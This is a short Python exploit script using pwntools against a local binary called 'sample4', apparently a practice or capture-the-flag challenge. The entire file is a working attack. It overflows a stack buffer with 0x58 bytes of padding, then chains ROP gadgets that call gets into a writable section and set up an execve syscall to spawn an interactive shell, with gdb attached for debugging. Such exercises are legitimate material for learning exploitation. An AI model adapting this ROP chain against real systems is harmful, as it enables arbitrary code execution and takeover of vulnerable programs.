#!/usr/bin/python3

from pwn import *

context.binary = elf = ELF("./sample4", checksec = False)
con = process()
gdb.attach(con, gdbscript = "start")

syscall_ret = 0x0000000000404546
pop_rax_ret = 0x0000000000401001
pop_rdi_ret = 0x000000000040220e
pop_rsi_ret = 0x00000000004015ae 
rw_section = 0x406c30

payload = b"A"*0x58 + p64(pop_rdi_ret) + p64(rw_section) + p64(elf.sym['gets']) + p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(rw_section) + p64(pop_rsi_ret) + p64(0) + p64(syscall_ret)

con.send(payload)
con.interactive()
